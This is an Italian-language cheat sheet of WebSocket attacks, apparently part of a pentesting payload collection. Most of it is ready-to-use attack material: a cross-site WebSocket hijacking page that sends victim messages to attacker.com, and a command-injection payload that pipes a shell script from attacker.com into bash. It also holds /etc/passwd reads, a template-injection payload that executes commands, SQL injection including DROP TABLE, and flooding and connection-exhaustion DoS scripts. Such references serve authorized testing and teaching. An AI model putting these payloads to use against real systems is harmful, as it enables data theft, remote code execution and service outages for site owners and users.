# 🔌 Scheda di riferimento sugli attacchi WebSocket

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](WebSocket-Attacks.el.md)

> **Nota sugli esempi originali:** La sola assenza di verifica di Origin non dimostra un CSWSH sfruttabile: contano anche autenticazione, cookie e comportamento del browser/server. Origin non sostituisce l’autorizzazione sui messaggi. Il frammento “Implementazione sicura” è pseudocodice incompleto, non un server pronto all’uso; token negli URL e limiti di connessioni/messaggi richiedono gestione specifica.


```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

## 🔍 Fondamenti di WebSocket

### Richiesta di handshake
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Risposta di handshake
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Rilevamento
```
- ws:// (non cifrato)
- wss:// (cifrato con TLS)
- Header Upgrade: websocket
- La scheda Network mostra "101 Switching Protocols"
```

---

## 🎯 Vulnerabilità WebSocket

### 1. Dirottamento WebSocket tra siti (CSWSH)

**Condizione vulnerabile:** il server non convalida l'header Origin

```html
<!-- Pagina dell'attaccante -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Connessione aperta, l'attaccante può inviare messaggi
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Sottrai i dati e inviali all'attaccante
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**Attacco in stile CSRF:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Esegui azioni come la vittima
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Convalida di Origin assente

**Test:**
```bash
# Uso di wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Uso di websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Sfruttamento:**
```javascript
// Se il server accetta qualsiasi origine
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Aggiramento dell'autenticazione

**Connessione WS senza autenticazione:**
```javascript
// Collegati senza cookie/token
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // Non serve autenticazione?
};
```

**Token nell'URL (rischio di esposizione):**
```
wss://target.com/ws?token=SECRET_TOKEN
// Il token può finire nei log o negli header referrer
```

**Test di stati di autenticazione diversi:**
```javascript
// Prova con un token scaduto
// Prova con un token modificato
// Prova senza token
// Prova con il token di un altro utente
```

---

### 4. Attacchi di injection tramite WebSocket

**XSS tramite WebSocket:**
```javascript
// Invia un payload XSS
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**SQL injection:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Command injection:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**NoSQL injection:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. Attacchi DoS

**Invio eccessivo di messaggi (flooding):**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Messaggi di grandi dimensioni
  }, 1);
};
```

**Esaurimento delle connessioni:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Mantieni aperta la connessione

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Manipolazione dei dati

**Alterazione dei messaggi:**
```javascript
// Intercetta e modifica i messaggi
// Usa l'intercettazione WebSocket di Burp Suite

// Originale
{"action": "transfer", "amount": 10, "to": "user123"}

// Modificato
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Condizioni di gara (race condition):**
```javascript
// Invia più richieste in rapida successione
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

## 🛠 Strumenti per i test

### Burp Suite
```
1. Proxy → WebSockets history
2. Clic destro → Send to Repeater
3. Modifica e reinvia i messaggi
4. Seleziona "Auto-scroll to end"
```

### wscat (CLI)
```bash
# Installazione
npm install -g wscat

# Connessione
wscat -c wss://target.com/ws

# Con header
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# Con origine
wscat -c wss://target.com/ws -o "https://target.com"
```

### websocat
```bash
# Installazione
cargo install websocat

# Connessione
websocat wss://target.com/ws

# Con header
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Script di test Python
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Payload di test
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Strumenti di sviluppo del browser
```javascript
// Monitora il traffico WebSocket
// F12 → Network → filtro WS

// Test manuali
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

## 💉 Raccolta di payload

### Test dell'autenticazione
```json
// Senza autenticazione
{"action": "get_secret_data"}

// Token vuoto
{"token": "", "action": "admin_action"}

// Token nullo
{"token": null, "action": "delete_user"}
```

### Payload XSS
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### Payload SQLi
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Command injection
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Attraversamento delle directory (path traversal)
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

## 📋 Checklist dei test

```markdown
## Checklist di sicurezza WebSocket

□ Identifica gli endpoint WebSocket
□ Verifica la convalida dell'header Origin
□ Verifica il CSWSH (Cross-Site WebSocket Hijacking)
□ Verifica i requisiti di autenticazione
□ Verifica che i token vengano trasmessi in modo sicuro
□ Verifica le vulnerabilità di injection (XSS, SQLi, ecc.)
□ Verifica l'autorizzazione (accesso ai dati di altri utenti)
□ Verifica la limitazione della frequenza delle richieste
□ Verifica i limiti delle dimensioni dei messaggi
□ Cerca eventuali esposizioni di dati sensibili
□ Verifica la gestione delle connessioni (riconnessione)
□ Verifica la cifratura (wss:// rispetto a ws://)
```

---

## 🔐 Implementazione sicura

```javascript
// Convalida di Origin lato server
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Autenticazione basata su token
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Convalida dell'input
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

## 🔗 Payload correlati

- [Payload XSS](./XSS.it.md)
- [Payload SQLi](./SQLi.it.md)
- [Command injection](./Command-Injection.it.md)

---

**Torna ai payload:** [💉 Raccolta di payload](../../README.it.md#category-18)
